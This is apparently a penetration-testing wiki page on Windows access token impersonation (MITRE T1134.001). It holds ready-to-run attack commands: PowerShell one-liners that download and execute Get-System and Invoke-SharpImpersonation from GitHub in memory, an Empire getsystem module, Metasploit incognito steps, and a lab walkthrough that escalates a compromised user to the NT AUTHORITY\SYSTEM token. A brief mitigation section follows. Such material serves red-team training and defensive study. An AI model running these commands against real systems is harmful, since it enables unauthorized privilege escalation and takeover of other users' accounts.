---
description: https://attack.mitre.org/techniques/T1134/001/
---

# Token Impersonation

**ATT\&CK ID:** [T1134.001](https://attack.mitre.org/techniques/T1134/001/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:red;">**SYSTEM**</mark> | <mark style="color:green;">**User**</mark>

**Description**

Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using `DuplicateToken(Ex)`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.

\[[Source](https://attack.mitre.org/techniques/T1134/001/)]

## Techniques

### Empire

```
usemodule/powershell/privesc/getsystem
```

![](<../../../.gitbook/assets/image (1008).png>)

### Get-System

```
IEX (IWR -usebasicparsing  https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/privesc/Get-System.ps1);Get-System
```

![](<../../../.gitbook/assets/Get-System (2).png>)

### Metasploit

```bash
# Load token module
load incognito

# List available tokens
list_tokens -u

# Impersonate token
impersonate_token <FullNameOfToken>

# Revert to original token (Meterpreter)
rev2self
```

### SharpImpersonation (Invoke)

**URL:** [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1)

Load into memory

```
IEX (IWR -usebasicparsing https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1)
```

<pre class="language-powershell"><code class="lang-powershell"># List current tokens on system
Invoke-SharpImpersonation -Command "list"
Invoke-SharpImpersonation -Command "list wmi"

# Attempt to impersonate user with first process found 
Invoke-SharpImpersonation -Command "user:&#x3C;Domain\User>"

# Impersonate in current thread
Invoke-SharpImpersonation "user:&#x3C;Domain\User> technique:ImpersonateLoggedOnUser"

# Inject directly into a process ID
Invoke-SharpImpersonation -Command "pid:&#x3C;PID>"

<strong># Impersonate first process of target user to a custom binary path
</strong>Invoke-SharpImpersonation -Command "user:&#x3C;Domain\User> binary:&#x3C;binary-Path>"
Invoke-SharpImpersonation -Command "user:&#x3C;Domain\User> binary:powershell.exe"
Invoke-SharpImpersonation -Command "user:&#x3C;Domain\User> binary:cmd.exe"

# List all running processes and users natively
Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName
</code></pre>

## Scenario

In this scenario we will be using Metasploit. This scenario assumes we already have gained shell access on the target system as the user 'Bart.Simpson'.

In Metasploit we can load the incognito module with the command `load incognito`. This will load the modules required to impersonate another users token. Once loaded we can use the `help` command to show if the module has loaded and what options are available to us.

![](<../../../.gitbook/assets/image (1537).png>)

We can then list the available tokens for users with the `list_tokens -u` command.

![](<../../../.gitbook/assets/image (1538).png>)

In the example below we will attempt to load the 'NT AUTHORITY\SYSTEM' token. with the command:

```
impersonate_token <token>
```

![](<../../../.gitbook/assets/image (1539).png>)

Tokens will persist until a machine has been rebooted. Below I have rebooted the target machine and logged in as the user 'Lisa.Simpson'. I then exploited the machine and viewed available tokens. As we can see we have less available to us now that the machine has been rebooted.

![](<../../../.gitbook/assets/image (1540).png>)

### **Rev2self**

The `meterpreter` command Rev2self can be used to revert to the original user token.

![](<../../../.gitbook/assets/image (423).png>)

## Token Types

#### Delegation

Are generally created when a user logs on interactively to the target system. Delegation tokens can be used elsewhere on the network.

#### Impersonation

Impersonation tokens run in an alternative security context to the process that started it. These tokens are generally not used elsewhere on the network.

***

{% hint style="info" %}
Due to the fact that tokens persist until reboot. Servers and File Servers are a potential treasure troves for tokens.
{% endhint %}

## Mitigation

* Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > \[Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > \[Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.
* Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command `runas`.
* An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.

## Further Reading:

**Analysis of Access Token Theft and Manipulation:** [https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf](https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf)
